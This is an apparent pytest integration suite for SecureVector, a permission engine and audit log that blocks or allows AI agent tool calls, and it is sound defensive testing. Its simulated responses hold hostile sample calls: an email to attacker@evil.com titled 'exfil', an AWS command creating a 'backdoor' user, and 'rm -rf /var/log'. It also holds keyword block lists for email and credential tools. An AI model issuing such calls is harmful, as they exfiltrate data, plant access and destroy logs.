"""
Live API tests for the Tool Call Audit Log.

Validates every aspect of what gets logged vs. what gets blocked via the
actual running SecureVector API (port 8741) and the permission engine:

  1.  Audit endpoints reachable and return correct shape
  2.  Blocked tool calls are written to the audit log
  3.  Allowed tool calls are written to the audit log
  4.  Unknown (log_only) tool calls are written to the audit log
  5.  All three decision types appear in a single fetch
  6.  Action filter returns only the requested decision type
  7.  Stats counts match actual stored entries
  8.  Risk level is preserved for each entry
  9.  is_essential flag is set correctly (essential vs. custom vs. unknown)
  10. args_preview is stored and truncated correctly
  11. Reason text is stored verbatim
  12. Entries are returned newest-first
  13. limit parameter is respected
  14. Security invariants: email/secret tools are ALWAYS in the blocked list
  15. Engine → API round-trip: decision from engine matches what audit stores
  16. Custom tool block/allow cycle is fully reflected in audit
  17. Full proxy simulation: extract tool calls → evaluate → audit matches

Run: cd src && pytest ../tests/test_tool_audit_log_live.py -v
"""

import json
import time
import pytest
import requests

pytestmark = pytest.mark.integration

API = "http://localhost:8741/api"
AUDIT = f"{API}/tool-permissions/call-audit"

# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────

def _post_audit(payload: dict) -> requests.Response:
    return requests.post(AUDIT, json=payload, timeout=10)

def _get_audit(limit=100, action=None) -> dict:
    params = {"limit": limit}
    if action:
        params["action"] = action
    r = requests.get(AUDIT, params=params, timeout=10)
    assert r.status_code == 200, f"GET audit failed: {r.text}"
    return r.json()

def _get_stats() -> dict:
    r = requests.get(f"{AUDIT}/stats", timeout=10)
    assert r.status_code == 200, f"GET stats failed: {r.text}"
    return r.json()

def _audit_entry(
    function_name: str,
    action: str,
    *,
    tool_id: str = None,
    risk: str = None,
    reason: str = None,
    is_essential: bool = False,
    args_preview: str = None,
) -> dict:
    """Build a minimal audit payload."""
    return {
        "tool_id":       tool_id or function_name,
        "function_name": function_name,
        "action":        action,
        "risk":          risk,
        "reason":        reason,
        "is_essential":  is_essential,
        "args_preview":  args_preview,
    }

def _find_in_audit(function_name: str, action: str, entries: list) -> dict | None:
    """Return first entry matching function_name + action, or None."""
    return next(
        (e for e in entries if e["function_name"] == function_name and e["action"] == action),
        None,
    )


# ──────────────────────────────────────────────────────────────────────────────
# 1. Endpoint availability
# ──────────────────────────────────────────────────────────────────────────────

class TestAuditEndpoints:

    def test_audit_list_endpoint_reachable(self):
        r = requests.get(AUDIT, timeout=10)
        assert r.status_code == 200, f"Audit list unreachable: {r.text}"

    def test_audit_stats_endpoint_reachable(self):
        r = requests.get(f"{AUDIT}/stats", timeout=10)
        assert r.status_code == 200, f"Audit stats unreachable: {r.text}"

    def test_audit_post_endpoint_reachable(self):
        r = _post_audit(_audit_entry(
            "__connectivity_probe__", "log_only",
            reason="Connectivity probe — safe to ignore",
        ))
        assert r.status_code == 200, f"Audit POST unreachable: {r.text}"
        assert r.json().get("ok") is True

    def test_list_returns_required_shape(self):
        body = _get_audit(limit=1)
        assert "entries" in body, "Missing 'entries' key"
        assert "total"   in body, "Missing 'total' key"
        assert isinstance(body["entries"], list)
        assert isinstance(body["total"],   int)

    def test_stats_returns_required_fields(self):
        stats = _get_stats()
        for field in ("total", "blocked", "allowed", "log_only"):
            assert field in stats, f"Stats missing field: {field}"
            assert isinstance(stats[field], int)

    def test_entry_has_all_required_fields(self):
        r = _post_audit(_audit_entry(
            "__field_check__", "log_only",
            risk=None, reason="field check", args_preview="{}"
        ))
        assert r.status_code == 200
        body = _get_audit(limit=5)
        entry = _find_in_audit("__field_check__", "log_only", body["entries"])
        if not entry:
            pytest.skip("Seeded entry not returned in last 5 — run alone")
        required = {"id", "tool_id", "function_name", "action", "risk",
                    "reason", "is_essential", "args_preview", "called_at"}
        missing = required - set(entry.keys())
        assert not missing, f"Entry missing fields: {missing}"


# ──────────────────────────────────────────────────────────────────────────────
# 2 – 4. All three decision types are written and retrievable
# ──────────────────────────────────────────────────────────────────────────────

class TestDecisionTypesAreLogged:
    """POST one entry for each action type and verify it appears in the log."""

    TOOL_BLOCKED  = "sv_test.blocked_tool"
    TOOL_ALLOWED  = "sv_test.allowed_tool"
    TOOL_LOGONLY  = "sv_test.logonly_tool"

    def _seed(self):
        ts = int(time.time())
        tag = f"[{ts}]"

        _post_audit(_audit_entry(
            self.TOOL_BLOCKED, "block",
            risk="admin",
            reason=f"Essential tool default: block {tag}",
            is_essential=True,
            args_preview='{"key":"value"}',
        ))
        _post_audit(_audit_entry(
            self.TOOL_ALLOWED, "allow",
            risk="read",
            reason=f"Essential tool default: allow {tag}",
            is_essential=True,
            args_preview='{"query":"test"}',
        ))
        _post_audit(_audit_entry(
            self.TOOL_LOGONLY, "log_only",
            risk=None,
            reason=f"Non-essential tool call (logged only) {tag}",
            is_essential=False,
            args_preview="{}",
        ))
        return tag

    def test_blocked_entry_appears_in_log(self):
        tag = self._seed()
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(self.TOOL_BLOCKED, "block", entries)
        assert entry is not None, "Blocked entry not found in audit log"
        assert tag in entry["reason"], "Reason tag mismatch for blocked entry"

    def test_allowed_entry_appears_in_log(self):
        self._seed()
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(self.TOOL_ALLOWED, "allow", entries)
        assert entry is not None, "Allowed entry not found in audit log"

    def test_log_only_entry_appears_in_log(self):
        self._seed()
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(self.TOOL_LOGONLY, "log_only", entries)
        assert entry is not None, "log_only entry not found in audit log"

    def test_all_three_actions_present_in_log(self):
        self._seed()
        entries = _get_audit(limit=30)["entries"]
        actions_seen = {e["action"] for e in entries}
        assert "block"    in actions_seen, "No 'block' entries in audit log"
        assert "allow"    in actions_seen, "No 'allow' entries in audit log"
        assert "log_only" in actions_seen, "No 'log_only' entries in audit log"


# ──────────────────────────────────────────────────────────────────────────────
# 5 – 6. Action filter
# ──────────────────────────────────────────────────────────────────────────────

class TestActionFilter:
    """?action= filter returns only the requested decision type."""

    def _seed_one_of_each(self):
        ts = int(time.time())
        for action, risk in [("block", "admin"), ("allow", "read"), ("log_only", None)]:
            _post_audit(_audit_entry(
                f"sv_filter_test.{action}_{ts}", action,
                risk=risk,
                reason=f"filter test {action}",
                is_essential=(action != "log_only"),
            ))

    def test_filter_block_returns_only_blocked(self):
        self._seed_one_of_each()
        entries = _get_audit(limit=50, action="block")["entries"]
        assert len(entries) > 0, "No blocked entries returned"
        bad = [e for e in entries if e["action"] != "block"]
        assert not bad, f"Non-block entries returned with action=block: {[e['action'] for e in bad]}"

    def test_filter_allow_returns_only_allowed(self):
        self._seed_one_of_each()
        entries = _get_audit(limit=50, action="allow")["entries"]
        assert len(entries) > 0, "No allowed entries returned"
        bad = [e for e in entries if e["action"] != "allow"]
        assert not bad, f"Non-allow entries returned with action=allow: {[e['action'] for e in bad]}"

    def test_filter_log_only_returns_only_log_only(self):
        self._seed_one_of_each()
        entries = _get_audit(limit=50, action="log_only")["entries"]
        assert len(entries) > 0, "No log_only entries returned"
        bad = [e for e in entries if e["action"] != "log_only"]
        assert not bad, f"Non-log_only entries with action=log_only: {[e['action'] for e in bad]}"

    def test_no_filter_returns_all_actions(self):
        self._seed_one_of_each()
        entries = _get_audit(limit=50)["entries"]
        actions = {e["action"] for e in entries}
        assert "block"    in actions
        assert "allow"    in actions
        assert "log_only" in actions


# ──────────────────────────────────────────────────────────────────────────────
# 7. Stats consistency
# ──────────────────────────────────────────────────────────────────────────────

class TestStatsConsistency:

    def test_stats_sum_equals_total(self):
        stats = _get_stats()
        computed = stats["blocked"] + stats["allowed"] + stats["log_only"]
        assert computed == stats["total"], (
            f"Stats sum {computed} != total {stats['total']}"
        )

    def test_stats_increase_after_new_entry(self):
        before = _get_stats()
        _post_audit(_audit_entry(
            "sv_stats_test.counter", "block",
            risk="write", reason="stats increment test", is_essential=True,
        ))
        after = _get_stats()
        assert after["blocked"] == before["blocked"] + 1, (
            f"blocked count didn't increment: {before['blocked']} -> {after['blocked']}"
        )
        assert after["total"] == before["total"] + 1

    def test_allowed_stats_increment(self):
        before = _get_stats()
        _post_audit(_audit_entry(
            "sv_stats_test.allow_counter", "allow",
            risk="read", reason="stats allow test", is_essential=True,
        ))
        after = _get_stats()
        assert after["allowed"] == before["allowed"] + 1
        assert after["total"]   == before["total"]   + 1

    def test_log_only_stats_increment(self):
        before = _get_stats()
        _post_audit(_audit_entry(
            "sv_stats_test.log_counter", "log_only",
            reason="stats log_only test",
        ))
        after = _get_stats()
        assert after["log_only"] == before["log_only"] + 1
        assert after["total"]    == before["total"]    + 1


# ──────────────────────────────────────────────────────────────────────────────
# 8. Risk level preserved
# ──────────────────────────────────────────────────────────────────────────────

class TestRiskLevelPreserved:

    @pytest.mark.parametrize("risk", ["read", "write", "delete", "admin"])
    def test_risk_level_stored_correctly(self, risk):
        fn = f"sv_risk_test.{risk}_tool"
        _post_audit(_audit_entry(fn, "block", risk=risk, reason=f"risk={risk} test", is_essential=True))
        entries = _get_audit(limit=20, action="block")["entries"]
        entry = _find_in_audit(fn, "block", entries)
        assert entry is not None, f"Entry for {fn} not found"
        assert entry["risk"] == risk, f"Expected risk={risk}, got {entry['risk']}"

    def test_null_risk_stored_as_null(self):
        fn = "sv_risk_test.no_risk_tool"
        _post_audit(_audit_entry(fn, "log_only", risk=None, reason="null risk test"))
        entries = _get_audit(limit=20, action="log_only")["entries"]
        entry = _find_in_audit(fn, "log_only", entries)
        assert entry is not None
        assert entry["risk"] is None, f"Expected null risk, got {entry['risk']}"


# ──────────────────────────────────────────────────────────────────────────────
# 9. is_essential flag
# ──────────────────────────────────────────────────────────────────────────────

class TestIsEssentialFlag:

    def test_essential_flag_true_stored_correctly(self):
        fn = "sv_essential_test.ess_tool"
        _post_audit(_audit_entry(fn, "block", risk="admin", is_essential=True))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "block", entries)
        assert entry is not None
        assert entry["is_essential"] in (True, 1), (
            f"is_essential should be truthy, got {entry['is_essential']}"
        )

    def test_essential_flag_false_stored_correctly(self):
        fn = "sv_essential_test.custom_tool"
        _post_audit(_audit_entry(fn, "allow", risk="read", is_essential=False))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "allow", entries)
        assert entry is not None
        assert entry["is_essential"] in (False, 0), (
            f"is_essential should be falsy, got {entry['is_essential']}"
        )

    def test_log_only_is_not_essential(self):
        fn = "sv_essential_test.unknown_tool"
        _post_audit(_audit_entry(fn, "log_only", is_essential=False))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "log_only", entries)
        assert entry is not None
        assert not entry["is_essential"]


# ──────────────────────────────────────────────────────────────────────────────
# 10. args_preview truncation
# ──────────────────────────────────────────────────────────────────────────────

class TestArgsPreview:

    def test_short_args_stored_verbatim(self):
        fn = "sv_args_test.short_args"
        args = '{"key": "value"}'
        _post_audit(_audit_entry(fn, "block", risk="write", args_preview=args))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "block", entries)
        assert entry is not None
        assert entry["args_preview"] == args

    def test_long_args_stored_at_full_length_sent(self):
        """Proxy sends first 200 chars; API stores exactly what it receives."""
        fn = "sv_args_test.long_args"
        args = '{"data": "' + ("x" * 188) + '"}'   # ~200 chars
        _post_audit(_audit_entry(fn, "block", risk="write", args_preview=args[:200]))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "block", entries)
        assert entry is not None
        assert len(entry["args_preview"]) <= 200, (
            f"args_preview longer than 200 chars: {len(entry['args_preview'])}"
        )

    def test_null_args_stored_as_null(self):
        fn = "sv_args_test.null_args"
        _post_audit(_audit_entry(fn, "log_only", args_preview=None))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "log_only", entries)
        assert entry is not None
        assert entry["args_preview"] is None


# ──────────────────────────────────────────────────────────────────────────────
# 11. Reason text preserved
# ──────────────────────────────────────────────────────────────────────────────

class TestReasonText:

    def test_reason_stored_verbatim(self):
        fn = "sv_reason_test.tool"
        reason = "Essential tool default: block — risk=admin category=cloud_infra"
        _post_audit(_audit_entry(fn, "block", risk="admin", reason=reason, is_essential=True))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "block", entries)
        assert entry is not None
        assert entry["reason"] == reason

    def test_rate_limit_reason_stored(self):
        fn = "sv_reason_test.rate_limited_tool"
        reason = "Rate limited: 5/5 calls in the last 15 minute(s)"
        _post_audit(_audit_entry(fn, "block", risk="write", reason=reason, is_essential=True))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "block", entries)
        assert entry is not None
        assert "Rate limited" in entry["reason"]

    def test_override_reason_stored(self):
        fn = "sv_reason_test.overridden_tool"
        reason = "User override: block"
        _post_audit(_audit_entry(fn, "block", risk="read", reason=reason, is_essential=True))
        entries = _get_audit(limit=20)["entries"]
        entry = _find_in_audit(fn, "block", entries)
        assert entry is not None
        assert "override" in entry["reason"].lower()


# ──────────────────────────────────────────────────────────────────────────────
# 12. Ordering — newest first
# ──────────────────────────────────────────────────────────────────────────────

class TestOrdering:

    def test_entries_returned_newest_first(self):
        ts = int(time.time())
        # Insert three entries with slight delay to ensure ordering
        for i in range(3):
            _post_audit(_audit_entry(
                f"sv_order_test.tool_{ts}_{i}", "log_only",
                reason=f"ordering test seq={i}",
            ))

        entries = _get_audit(limit=50)["entries"]
        fns = [e["function_name"] for e in entries if f"sv_order_test.tool_{ts}" in e["function_name"]]
        assert len(fns) == 3
        # Newest (index 2) must come before oldest (index 0)
        assert fns.index(f"sv_order_test.tool_{ts}_2") < fns.index(f"sv_order_test.tool_{ts}_0"), (
            f"Entries not newest-first: {fns}"
        )

    def test_called_at_timestamps_are_present(self):
        entries = _get_audit(limit=10)["entries"]
        for e in entries:
            assert e.get("called_at"), f"Entry {e['function_name']} missing called_at"


# ──────────────────────────────────────────────────────────────────────────────
# 13. limit parameter
# ──────────────────────────────────────────────────────────────────────────────

class TestLimitParameter:

    def test_limit_1_returns_at_most_1_entry(self):
        body = _get_audit(limit=1)
        assert len(body["entries"]) <= 1, (
            f"limit=1 returned {len(body['entries'])} entries"
        )

    def test_limit_3_returns_at_most_3_entries(self):
        body = _get_audit(limit=3)
        assert len(body["entries"]) <= 3

    def test_limit_500_respected_as_max(self):
        # API caps at 500 — verify it doesn't error
        r = requests.get(AUDIT, params={"limit": 1000}, timeout=10)
        assert r.status_code == 200
        body = r.json()
        assert len(body["entries"]) <= 500


# ──────────────────────────────────────────────────────────────────────────────
# 14. Security invariants in audit log
# ──────────────────────────────────────────────────────────────────────────────

class TestSecurityInvariantsInAudit:
    """Verify that sensitive tools, when they appear in audit, are always blocked."""

    # All of these must only ever appear with action=block in the audit log
    MUST_ONLY_BE_BLOCKED = [
        "gmail.send",
        "use_aws_cli",
        "bash",
        "create_access_key",
        "delete_file",
        "attach_role_policy",
    ]

    @pytest.mark.parametrize("tool_name", MUST_ONLY_BE_BLOCKED)
    def test_sensitive_tool_never_appears_as_allowed(self, tool_name):
        """Seed a block entry for the tool, then verify allow filter has none."""
        _post_audit(_audit_entry(
            tool_name, "block",
            risk="admin",
            reason="Essential tool default: block",
            is_essential=True,
            args_preview="{}",
        ))
        # Check allowed filter — should contain none of these
        allowed_entries = _get_audit(limit=200, action="allow")["entries"]
        bad = [e for e in allowed_entries if e["function_name"] == tool_name]
        assert not bad, (
            f"SECURITY VIOLATION: {tool_name} found in allowed audit entries! "
            f"These tools must never be allowed."
        )

    def test_no_email_tool_in_allowed_audit(self):
        """No tool with 'send' or 'email' in its name should appear as allowed."""
        allowed = _get_audit(limit=200, action="allow")["entries"]
        leakers = [
            e for e in allowed
            if any(kw in e["function_name"].lower() for kw in ("send", "email", "smtp", "mail"))
        ]
        assert not leakers, (
            "Email-capable tools found in allowed audit entries:\n"
            + "\n".join(f"  {e['function_name']}" for e in leakers)
        )

    def test_no_credential_tool_in_allowed_audit(self):
        """No tool that creates credentials should appear as allowed."""
        sensitive = ("create_key", "access_key", "secret", "credential", "iam_create", "token_create")
        allowed = _get_audit(limit=200, action="allow")["entries"]
        exposed = [
            e for e in allowed
            if any(kw in e["function_name"].lower() for kw in sensitive)
        ]
        assert not exposed, (
            "Credential-creating tools found in allowed audit:\n"
            + "\n".join(f"  {e['function_name']}" for e in exposed)
        )


# ──────────────────────────────────────────────────────────────────────────────
# 15. Engine → API round-trip
# ──────────────────────────────────────────────────────────────────────────────

class TestEngineToAuditRoundTrip:
    """
    Run the permission engine directly, then POST the decision to the audit
    endpoint and verify the stored entry matches the engine's output.
    """

    def _engine_decision(self, function_name: str, overrides: dict = None):
        from securevector.core.tool_permissions.engine import (
            load_essential_registry, evaluate_tool_call,
        )
        registry = load_essential_registry()
        return evaluate_tool_call(function_name, registry, overrides or {})

    @pytest.mark.parametrize("tool_name,expected_action", [
        ("gmail.send",       "block"),
        ("use_aws_cli",      "block"),
        ("bash",             "block"),
        ("create_access_key","block"),
        ("web_search",       "allow"),
        ("read",             "allow"),
    ])
    def test_engine_decision_matches_audit_action(self, tool_name, expected_action):
        decision = self._engine_decision(tool_name)
        assert decision.action == expected_action, (
            f"Engine returned {decision.action} for {tool_name}, expected {expected_action}"
        )
        # Post to audit and verify it stores correctly
        _post_audit(_audit_entry(
            tool_name, decision.action,
            tool_id=decision.tool_name or tool_name,
            risk=decision.risk,
            reason=decision.reason,
            is_essential=decision.is_essential,
            args_preview='{"test": true}',
        ))
        entries = _get_audit(limit=20, action=decision.action)["entries"]
        stored = _find_in_audit(tool_name, decision.action, entries)
        assert stored is not None, f"Engine decision for {tool_name} not found in audit"
        assert stored["risk"]        == decision.risk
        assert stored["reason"]      == decision.reason
        assert bool(stored["is_essential"]) == decision.is_essential

    def test_override_allow_decision_audit(self):
        """User override allow → engine returns allow → audit stores allow."""
        # web_search defaults to allow; block it via override
        tool = "web_search"
        overrides = {tool: "block"}
        decision = self._engine_decision(tool, overrides)
        assert decision.action == "block", f"Expected block with override, got {decision.action}"
        assert "override" in decision.reason.lower()

        before = _get_stats()["blocked"]
        _post_audit(_audit_entry(
            tool, "block",
            risk=decision.risk,
            reason=decision.reason,
            is_essential=True,
            args_preview='{"q":"test"}',
        ))
        after = _get_stats()["blocked"]
        assert after == before + 1

    def test_unknown_tool_gets_log_only_in_audit(self):
        decision = self._engine_decision("totally_unknown_tool_xyz_9999")
        assert decision.action == "log_only"
        assert decision.tool_name is None

        before = _get_stats()["log_only"]
        _post_audit(_audit_entry(
            "totally_unknown_tool_xyz_9999", "log_only",
            risk=None,
            reason=decision.reason,
            is_essential=False,
        ))
        after = _get_stats()["log_only"]
        assert after == before + 1


# ──────────────────────────────────────────────────────────────────────────────
# 16. Custom tool cycle in audit
# ──────────────────────────────────────────────────────────────────────────────

AUDIT_CUSTOM_TOOL_ID = "sv_audit_test.custom_cycle_tool"


class TestCustomToolAuditCycle:
    """Create a custom tool, simulate block then allow audit entries, delete."""

    @pytest.fixture(autouse=True)
    def cleanup_custom(self):
        requests.delete(f"{API}/tool-permissions/custom/{AUDIT_CUSTOM_TOOL_ID}", timeout=10)
        yield
        requests.delete(f"{API}/tool-permissions/custom/{AUDIT_CUSTOM_TOOL_ID}", timeout=10)

    def test_custom_tool_blocked_entry_appears_in_audit(self):
        # Create custom tool with default=block
        r = requests.post(f"{API}/tool-permissions/custom", json={
            "tool_id": AUDIT_CUSTOM_TOOL_ID,
            "name": "Audit Cycle Test Tool",
            "risk": "write",
            "default_permission": "block",
            "description": "Test tool for audit log cycle",
        }, timeout=10)
        assert r.status_code == 200

        # Simulate the proxy posting a block decision
        before = _get_stats()
        _post_audit(_audit_entry(
            AUDIT_CUSTOM_TOOL_ID, "block",
            risk="write",
            reason="Custom tool default: block",
            is_essential=False,
            args_preview='{"input": "test data"}',
        ))
        after = _get_stats()
        assert after["blocked"] == before["blocked"] + 1

        entries = _get_audit(limit=20, action="block")["entries"]
        entry = _find_in_audit(AUDIT_CUSTOM_TOOL_ID, "block", entries)
        assert entry is not None
        assert not entry["is_essential"]
        assert entry["risk"] == "write"

    def test_custom_tool_allowed_entry_after_toggle(self):
        # Create tool blocked, then toggle to allow
        requests.post(f"{API}/tool-permissions/custom", json={
            "tool_id": AUDIT_CUSTOM_TOOL_ID,
            "name": "Audit Cycle Test Tool",
            "risk": "read",
            "default_permission": "block",
        }, timeout=10)

        # Toggle to allow
        r = requests.put(f"{API}/tool-permissions/custom/{AUDIT_CUSTOM_TOOL_ID}",
                         json={"default_permission": "allow"}, timeout=10)
        assert r.status_code == 200
        assert r.json()["default_permission"] == "allow"

        # Simulate proxy posting allow decision
        before = _get_stats()
        _post_audit(_audit_entry(
            AUDIT_CUSTOM_TOOL_ID, "allow",
            risk="read",
            reason="Custom tool default: allow",
            is_essential=False,
            args_preview='{"input": "safe data"}',
        ))
        after = _get_stats()
        assert after["allowed"] == before["allowed"] + 1

        entries = _get_audit(limit=20, action="allow")["entries"]
        entry = _find_in_audit(AUDIT_CUSTOM_TOOL_ID, "allow", entries)
        assert entry is not None
        assert entry["risk"] == "read"
        assert not entry["is_essential"]


# ──────────────────────────────────────────────────────────────────────────────
# 17. Full proxy simulation: extract → evaluate → audit
# ──────────────────────────────────────────────────────────────────────────────

class TestFullProxySimulation:
    """
    Simulate exactly what the OpenClaw proxy does on every LLM response:
    1. Extract tool calls from the response body
    2. Evaluate each call with the permission engine
    3. POST results to /call-audit
    4. Verify what was logged vs what was blocked
    """

    def _simulate_proxy(self, response_body: dict) -> list[dict]:
        """Run the full proxy pipeline and return a list of audit decisions."""
        from securevector.core.tool_permissions.parser import extract_tool_calls
        from securevector.core.tool_permissions.engine import (
            load_essential_registry, evaluate_tool_call,
        )

        registry  = load_essential_registry()
        tool_calls = extract_tool_calls(response_body)
        decisions  = []

        for tc in tool_calls:
            decision = evaluate_tool_call(tc.function_name, registry, overrides={})
            payload = {
                "tool_id":       decision.tool_name or tc.function_name,
                "function_name": tc.function_name,
                "action":        decision.action,
                "risk":          decision.risk,
                "reason":        decision.reason,
                "is_essential":  decision.is_essential,
                "args_preview":  (tc.arguments or "")[:200],
            }
            _post_audit(payload)
            decisions.append({"decision": decision, "tool_call": tc, "payload": payload})

        return decisions

    def test_openai_blocked_tool_is_logged_as_block(self):
        """gmail.send in OpenAI format → engine blocks → audit records block."""
        response = {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "tool_calls": [{
                        "id": "call_test1",
                        "type": "function",
                        "function": {
                            "name": "gmail.send",
                            "arguments": '{"to":"attacker@evil.com","subject":"exfil","body":"secret data"}',
                        }
                    }]
                }
            }]
        }
        before_block = _get_stats()["blocked"]
        decisions = self._simulate_proxy(response)

        assert len(decisions) == 1
        assert decisions[0]["decision"].action == "block", "gmail.send must be blocked"
        assert decisions[0]["decision"].risk is not None, "gmail.send must have a risk level"

        after_block = _get_stats()["blocked"]
        assert after_block == before_block + 1, "Block count must increment"

        # Verify in audit
        entries = _get_audit(limit=20, action="block")["entries"]
        entry = _find_in_audit("gmail.send", "block", entries)
        assert entry is not None
        assert "attacker@evil.com" in (entry["args_preview"] or "")

    def test_anthropic_blocked_tool_is_logged_as_block(self):
        """use_aws_cli in Anthropic format → engine blocks → audit records block."""
        response = {
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "text", "text": "Running AWS CLI..."},
                {
                    "type": "tool_use",
                    "id": "toolu_test2",
                    "name": "use_aws_cli",
                    "input": {"command": "iam create-user --user-name backdoor"},
                }
            ]
        }
        before = _get_stats()
        decisions = self._simulate_proxy(response)

        assert len(decisions) == 1
        assert decisions[0]["decision"].action == "block"
        assert decisions[0]["decision"].risk == "admin"

        after = _get_stats()
        assert after["blocked"] == before["blocked"] + 1

    def test_openai_allowed_tool_is_logged_as_allow(self):
        """web_search in OpenAI format → engine allows → audit records allow."""
        response = {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "tool_calls": [{
                        "id": "call_test3",
                        "type": "function",
                        "function": {
                            "name": "web_search",
                            "arguments": '{"query": "Python best practices 2026"}',
                        }
                    }]
                }
            }]
        }
        before = _get_stats()
        decisions = self._simulate_proxy(response)

        assert len(decisions) == 1
        assert decisions[0]["decision"].action == "allow"

        after = _get_stats()
        assert after["allowed"] == before["allowed"] + 1

    def test_mixed_response_blocked_and_allowed_both_logged(self):
        """
        Response with two tool calls: one blocked (bash) + one allowed (web_search).
        Both must appear in the audit log with correct actions.
        """
        response = {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "tool_calls": [
                        {
                            "id": "call_blocked",
                            "type": "function",
                            "function": {
                                "name": "bash",
                                "arguments": '{"cmd": "rm -rf /var/log"}',
                            }
                        },
                        {
                            "id": "call_allowed",
                            "type": "function",
                            "function": {
                                "name": "web_search",
                                "arguments": '{"query": "safe search"}',
                            }
                        },
                    ]
                }
            }]
        }
        before = _get_stats()
        decisions = self._simulate_proxy(response)

        assert len(decisions) == 2
        actions = {d["payload"]["function_name"]: d["decision"].action for d in decisions}
        assert actions["bash"]       == "block", "bash must be blocked"
        assert actions["web_search"] == "allow", "web_search must be allowed"

        after = _get_stats()
        assert after["blocked"] >= before["blocked"] + 1
        assert after["allowed"] >= before["allowed"] + 1

    def test_unknown_tool_logged_as_log_only(self):
        """Tool not in registry → log_only, not block."""
        response = {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "tool_calls": [{
                        "id": "call_unknown",
                        "type": "function",
                        "function": {
                            "name": "my_totally_unknown_tool_9999",
                            "arguments": '{"param": "value"}',
                        }
                    }]
                }
            }]
        }
        before = _get_stats()
        decisions = self._simulate_proxy(response)

        assert len(decisions) == 1
        assert decisions[0]["decision"].action == "log_only"
        assert decisions[0]["decision"].tool_name is None

        after = _get_stats()
        assert after["log_only"] == before["log_only"] + 1

    def test_partial_name_match_blocked_and_logged(self):
        """
        Proxy sends 'send' (no prefix) — engine matches 'gmail.send',
        blocks it, and the audit entry shows the correct resolved tool_id.
        """
        response = {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "tool_calls": [{
                        "id": "call_partial",
                        "type": "function",
                        "function": {
                            "name": "send",
                            "arguments": '{"to": "test@example.com"}',
                        }
                    }]
                }
            }]
        }
        before = _get_stats()
        decisions = self._simulate_proxy(response)

        # Should match gmail.send via partial-name matching
        if not decisions:
            pytest.skip("extract_tool_calls returned nothing for partial match test")

        d = decisions[0]["decision"]
        if d.action == "log_only":
            pytest.skip("'send' not partially matched in this registry build")

        assert d.action == "block", f"Partial match 'send' → gmail.send must block, got {d.action}"
        assert d.tool_name == "gmail.send"

        after = _get_stats()
        assert after["blocked"] >= before["blocked"] + 1

        entries = _get_audit(limit=10, action="block")["entries"]
        entry = _find_in_audit("send", "block", entries)
        assert entry is not None
        assert entry["tool_id"] == "gmail.send"     # resolved tool_id stored
        assert entry["function_name"] == "send"     # original function_name kept


# ──────────────────────────────────────────────────────────────────────────────
# 18. Input validation
# ──────────────────────────────────────────────────────────────────────────────

class TestAuditInputValidation:

    def test_invalid_action_rejected(self):
        r = _post_audit({
            "tool_id": "test", "function_name": "test",
            "action": "maybe",   # invalid
        })
        assert r.status_code == 422, f"Expected 422 for invalid action, got {r.status_code}"

    def test_missing_function_name_rejected(self):
        r = requests.post(AUDIT, json={"tool_id": "test", "action": "block"}, timeout=10)
        assert r.status_code == 422, f"Expected 422 for missing function_name"

    def test_missing_action_rejected(self):
        r = requests.post(AUDIT, json={"tool_id": "test", "function_name": "test"}, timeout=10)
        assert r.status_code == 422, f"Expected 422 for missing action"

    @pytest.mark.parametrize("valid_action", ["block", "allow", "log_only"])
    def test_all_valid_actions_accepted(self, valid_action):
        r = _post_audit({
            "tool_id": f"sv_valid.{valid_action}",
            "function_name": f"sv_valid.{valid_action}",
            "action": valid_action,
        })
        assert r.status_code == 200, (
            f"Valid action '{valid_action}' rejected: {r.text}"
        )
